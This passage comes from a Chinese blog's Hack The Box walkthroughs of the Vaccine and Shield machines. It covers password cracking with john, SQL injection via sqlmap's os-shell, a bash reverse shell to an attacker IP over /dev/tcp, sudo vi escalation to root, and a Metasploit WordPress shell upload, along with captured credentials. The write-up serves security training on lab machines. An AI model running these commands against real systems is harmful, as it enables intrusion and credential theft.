</code></pre><p>下一关信息：</p><p>切换到<code>/root/.config/filezilla</code>，查看<code>filezilla.xml</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@oopsie:/root/.config/filezilla# cat filezilla.xml
</span></span></code></pre></div><p>内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;FileZilla3&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;RecentServers&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;Server&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;Host&gt;</span>10.10.10.46<span style=color:#f92672>&lt;/Host&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;Port&gt;</span>21<span style=color:#f92672>&lt;/Port&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;Protocol&gt;</span>0<span style=color:#f92672>&lt;/Protocol&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;Type&gt;</span>0<span style=color:#f92672>&lt;/Type&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;User&gt;</span>ftpuser<span style=color:#f92672>&lt;/User&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;Pass&gt;</span>mc@F1l3ZilL4<span style=color:#f92672>&lt;/Pass&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;Logontype&gt;</span>1<span style=color:#f92672>&lt;/Logontype&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;TimezoneOffset&gt;</span>0<span style=color:#f92672>&lt;/TimezoneOffset&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;PasvMode&gt;</span>MODE_DEFAULT<span style=color:#f92672>&lt;/PasvMode&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;MaximumMultipleConnections&gt;</span>0<span style=color:#f92672>&lt;/MaximumMultipleConnections&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;EncodingType&gt;</span>Auto<span style=color:#f92672>&lt;/EncodingType&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;BypassProxy&gt;</span>0<span style=color:#f92672>&lt;/BypassProxy&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/Server&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/RecentServers&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/FileZilla3&gt;</span>
</span></span></code></pre></div><h1 id=accine>Accine<a hidden class=anchor aria-hidden=true href=#accine>#</a></h1><blockquote><p>目标：拿下系统权限。</p><p>靶机IP：10.10.10.46。</p></blockquote><h2 id=1信息收集-2>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集-2>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sS -sV 10.10.10.46
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.46 <span style=color:#f92672>(</span>10.10.10.46<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.30s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>997</span> closed ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>21/tcp open  ftp     vsftpd 3.0.3
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>直接访问<code>HTTP</code>服务，需要帐密，上一关我们只获得了一个<code>ftp</code>用户，尝试登录<code>ftp</code>服务器：</p><pre tabindex=0><code>ftp://ftpuser:mc@F1l3ZilL4@10.10.10.46/
</code></pre><p>下载得到<code>backup.zip</code>文件，解压的时候发现有密码，尝试使用常规暴力破解，时间太长顶不住。。。考虑先获取<code>backup.zip</code>的<code>hash</code>值，再使用<code>john</code>进行破解。</p><p>获取<code>hash</code>（在<code>root</code>下运行）：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>zip2john /home/oopsdc/Downloads/backup.zip &gt; hash
</span></span></code></pre></div><p>使用<code>john</code>对哈希文件进行破解：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>john hash
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>PKZIP <span style=color:#f92672>[</span>32/64<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>2</span> OpenMP threads
</span></span><span style=display:flex><span>Proceeding with single, rules:Single
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>5</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>4</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
</span></span><span style=display:flex><span>Almost <span style=color:#66d9ef>done</span>: Processing the remaining buffered candidate passwords, <span style=color:#66d9ef>if</span> any.
</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>6</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
</span></span><span style=display:flex><span>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
</span></span><span style=display:flex><span><span style=color:#ae81ff>741852963</span>        <span style=color:#f92672>(</span>backup.zip<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1g 0:00:00:00 DONE 2/3 <span style=color:#f92672>(</span>2021-09-16 10:00<span style=color:#f92672>)</span> 25.00g/s 1798Kp/s 1798Kc/s 1798KC/s 123456..Peter
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed
</span></span></code></pre></div><p>解压后得到<code>index.php</code>和<code>style.css</code>两个文件，在<code>index.php</code>中发现了用户帐密：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;admin&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>]) <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;2cb42f8734ea607eefed3b70af13bbd3&#34;</span>) {
</span></span><span style=display:flex><span>      $_SESSION[<span style=color:#e6db74>&#39;login&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;true&#34;</span>;
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: dashboard.php&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>对密码进行<code>md5</code>解密，得到最终帐密<code>admin/qwerty789</code>。</p><h2 id=2获取用户权限-1>2、获取用户权限<a hidden class=anchor aria-hidden=true href=#2获取用户权限-1>#</a></h2><p>登录后是一个目录页面，尝试测试搜索功能有无SQL注入。</p><p>页面回显不对，再次尝试<code>1'</code>发现有报错语句，<code>F12</code>拿一下当前的<code>PHPSESSION</code>，使用<code>sqlmap</code>查看当前数据库信息：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://10.10.10.46/dashboard.php?search=1&#34;</span> -dbs --cookie <span style=color:#e6db74>&#34;PHPSESSID=dudnfpur8hjgfam3gb22nna4sf&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> the back-end DBMS is PostgreSQL
</span></span><span style=display:flex><span>web server operating system: Linux Ubuntu 19.10 or 20.04 <span style=color:#f92672>(</span>focal or eoan<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>web application technology: Apache 2.4.41
</span></span><span style=display:flex><span>back-end DBMS: PostgreSQL
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> schema names are going to be used on PostgreSQL <span style=color:#66d9ef>for</span> enumeration as the counterpart to database names on other DBMSes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching database <span style=color:#f92672>(</span>schema<span style=color:#f92672>)</span> names
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;public&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;pg_catalog&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;information_schema&#39;</span>
</span></span><span style=display:flex><span>available databases <span style=color:#f92672>[</span>3<span style=color:#f92672>]</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> information_schema
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> pg_catalog
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> public
</span></span></code></pre></div><p>可以发现当前是<code>Posgtre</code>数据库，尝试能否执行<code>os-shell</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u http://10.10.10.46/dashboard.php?search<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> --cookie <span style=color:#e6db74>&#34;PHPSESSID=dudnfpur8hjgfam3gb22nna4sf&#34;</span> --os-shell
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>os-shell&gt; whoami
</span></span><span style=display:flex><span><span style=color:#66d9ef>do</span> you want to retrieve the command standard output? <span style=color:#f92672>[</span>Y/n/a<span style=color:#f92672>]</span> n 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>10:43:23<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;postgres&#39;</span>
</span></span></code></pre></div><blockquote><p>这里简要介绍一下<code>os-shell</code>的原理及使用条件：</p><p>原理：使用<code>into outfile</code>函数将可用来上传文件的<code>a.php</code>上传至网站根目录，然后再利用<code>a.php</code>上传一个用于执行并回显系统命令的<code>b.php</code>。</p><p>使用条件：1、网站必须为<code>root</code>权限；2、需要知道网站绝对路径；3、<code>CGP</code>为<code>off</code>，<code>PHP</code>主动转义功能关闭。</p></blockquote><p>接下来我们简单反弹一个<code>shell</code>，在<code>os-shell</code>中执行如下命令：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>bash -c <span style=color:#e6db74>&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.188/1234 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><p>切换到网站根目录并列出文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ostgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
</span></span><span style=display:flex><span>cd /var/www/html
</span></span><span style=display:flex><span>postgres@vaccine:/var/www/html$ ls
</span></span><span style=display:flex><span>ls
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>bg.png
</span></span><span style=display:flex><span>dashboard.css
</span></span><span style=display:flex><span>dashboard.js
</span></span><span style=display:flex><span>dashboard.php
</span></span><span style=display:flex><span>index.php
</span></span><span style=display:flex><span>license.txt
</span></span><span style=display:flex><span>style.css
</span></span></code></pre></div><p>查看<code>dashboard.php</code>内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>postgres@vaccine:/var/www/html$ cat dashboard.php
</span></span><span style=display:flex><span>cat dashboard.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 得到一个用户账号</span>
</span></span><span style=display:flex><span>	try <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>	  $conn <span style=color:#f92672>=</span> pg_connect<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>尝试直接<code>ssh</code>到主机：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>postgres@vaccine:~$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>111<span style=color:#f92672>(</span>postgres<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>117<span style=color:#f92672>(</span>postgres<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>117<span style=color:#f92672>(</span>postgres<span style=color:#f92672>)</span>,116<span style=color:#f92672>(</span>ssl-cert<span style=color:#f92672>)</span>
</span></span></code></pre></div><h2 id=3提权-1>3、提权<a hidden class=anchor aria-hidden=true href=#3提权-1>#</a></h2><p>查看当前用户的<code>sudo</code>权限：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>postgres@vaccine:~$ sudo -l
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> postgres: 
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> postgres on vaccine:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User postgres may run the following commands on vaccine:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf
</span></span></code></pre></div><p><code>pg_hba.conf</code>为<code>PostgreSQL</code>的访问策略配置文件，默认位于<code>/var/lib/pgsql/&lt;version>/data/</code>目录。</p><p>运行提示的命令：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
</span></span></code></pre></div><p>进入文件后默认为命令模式，按下<code>Shift</code>+<code>:</code>进入末行模式，运行<code>!/bin/bash</code>命令。</p><blockquote><p>注：需要在前面加一个空格。</p></blockquote><pre tabindex=0><code>: !/bin/bash
</code></pre><p>此时会退出<code>vi</code>编辑器，且用户变为<code>root</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@vaccine:/var/lib/postgresql# id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>提权成功。</p><h1 id=shield>Shield<a hidden class=anchor aria-hidden=true href=#shield>#</a></h1><blockquote><p>目标：拿到系统权限。</p><p>靶机IP：10.10.10.29。</p><p>吐槽：这真是一个卡到爆的靶场。</p></blockquote><h2 id=1信息收集-3>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集-3>#</a></h2><p>上<code>nmap</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sS -sV 10.10.10.29
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.29 <span style=color:#f92672>(</span>10.10.10.29<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.48s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> filtered ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>80/tcp   open  http    Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>3306/tcp open  mysql   MySQL <span style=color:#f92672>(</span>unauthorized<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><p>靶机开了80端口，用<code>dirsearch</code>扫一下目录：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo python3 dirsearch.py -u http://10.10.10.29/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span> -    0B  - /Wordpress/  -&gt;  http://10.10.10.29/wordpress/
</span></span></code></pre></div><p>使用<code>Wappalyzer</code>查看当前WP版本为5.2.1，IIS版本为10，尝试利用WP版本未授权访问漏洞查看敏感页面，无果。资料：</p><p><a href=https://www.freebuf.com/articles/web/244969.html>Wordpress(CVE-2019-17671)未授权访问漏洞复现 - FreeBuf网络安全行业门户</a></p><p>点击登录链接，尝试之前获得的密码，试出帐密<code>admin/P@s5w0rd!</code>。</p><p>有个媒体上传链接，点击其中已存在的图片查看保存路径：</p><pre tabindex=0><code>http://10.10.10.29/wordpress/wp-content/uploads/black-shield-shape-drawing-illustration-png-clip-art.png
</code></pre><p>尝试上传小马，各种绕过，奈何网络太差，总有莫名其妙的报错，放弃。</p><h2 id=2拿webshell>2、拿WebShell<a hidden class=anchor aria-hidden=true href=#2拿webshell>#</a></h2><p>祭出<code>msf</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># 启动matesploit framwork</span>
</span></span><span style=display:flex><span>msfconsole
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 使用模块</span>
</span></span><span style=display:flex><span>msf6 &gt; use exploit/unix/webapp/wp_admin_shell_upload
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 查看参数</span>
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name       Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----       ---------------  --------  -----------
</span></span><span style=display:flex><span>   PASSWORD                    yes       The WordPress password to authenticat
</span></span><span style=display:flex><span>                                         e with
</span></span><span style=display:flex><span>   Proxies                     no        A proxy chain of format type:host:por
</span></span><span style=display:flex><span>                                         t<span style=color:#f92672>[</span>,type:host:port<span style=color:#f92672>][</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   RHOSTS                      yes       The target host<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>, see https://githu
</span></span><span style=display:flex><span>                                         b.com/rapid7/metasploit-framework/wik
</span></span><span style=display:flex><span>                                         i/Using-Metasploit
</span></span><span style=display:flex><span>   RPORT      <span style=color:#ae81ff>80</span>               yes       The target port <span style=color:#f92672>(</span>TCP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   SSL        false            no        Negotiate SSL/TLS <span style=color:#66d9ef>for</span> outgoing connec
</span></span><span style=display:flex><span>                                         tions
</span></span><span style=display:flex><span>   TARGETURI  /                yes       The base path to the wordpress applic
</span></span><span style=display:flex><span>                                         ation
</span></span><span style=display:flex><span>   USERNAME                    yes       The WordPress username to authenticat
</span></span><span style=display:flex><span>                                         e with
</span></span><span style=display:flex><span>   VHOST                       no        HTTP server virtual host
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>php/meterpreter/reverse_tcp<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name   Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----   ---------------  --------  -----------
</span></span><span style=display:flex><span>   LHOST  10.211.55.8      yes       The listen address <span style=color:#f92672>(</span>an interface may be s
</span></span><span style=display:flex><span>                                     pecified<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   LPORT  <span style=color:#ae81ff>4444</span>             yes       The listen port
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   WordPress
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 设置参数</span>
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set PASSWORD P@s5w0rd!
</span></span><span style=display:flex><span>PASSWORD <span style=color:#f92672>=</span>&gt; P@s5w0rd!
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set RHOSTS 10.10.10.29
</span></span><span style=display:flex><span>RHOSTS <span style=color:#f92672>=</span>&gt; 10.10.10.29
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set TARGETURI /wordpress
</span></span><span style=display:flex><span>TARGETURI <span style=color:#f92672>=</span>&gt; /wordpress
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set USERNAME admin
</span></span><span style=display:flex><span>USERNAME <span style=color:#f92672>=</span>&gt; admin
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set LHOST 10.10.14.43
</span></span><span style=display:flex><span>LHOST <span style=color:#f92672>=</span>&gt; 10.10.14.43
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 输入run执行攻击，首先在Kali的4444默认端口使用我们输入的帐密建立反向TCP连接，然后上传payload到网站，成功后自动清除payload并建立meterpreter shell连接</span>
</span></span></code></pre></div><p>再怎么弄都不成功，本地搭的环境却可以，离谱，下一关。</p><blockquote><p>文章许可：本文采用<a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>CC BY-NC-SA 4.0</a>许可协议，转载请注明出处。</p></blockquote></div><footer class=post-footer><ul class=post-tags><li><a href=https://oopsdc.com/tags/hack-the-box/>Hack The Box</a></li></ul><nav class=paginav><a class=prev href=https://oopsdc.com/post/apereo-cas-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/><span class=title>« Prev</span><br><span>Apereo CAS RCE漏洞复现</span></a>
<a class=next href=https://oopsdc.com/post/lxrunoffline/><span class=title>Next »</span><br><span>LxRunOffline使用手册</span></a></nav></footer><div><div class=pagination__title><span class=pagination__title-h style=font-size:20px>Comments</span><hr></div><div id=tcomment></div><script src=https://cdn.staticfile.org/twikoo/1.6.6/twikoo.all.min.js></script>
<script>twikoo.init({envId:"https://twikoo-oopsdc.vercel.app/",el:"#tcomment",path:window.TWIKOO_MAGIC_PATH||window.location.pathname})</script></div></article></main><footer class=footer><div><span id=busuanzi_container_site_pv>Views: <span id=busuanzi_value_site_pv></span></span>
&nbsp;
<span id=busuanzi_container_site_uv>Visitors: <span id=busuanzi_value_site_uv></span></span></div><span>&copy; 2022 <a href=https://oopsdc.com/>0opsdc</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const 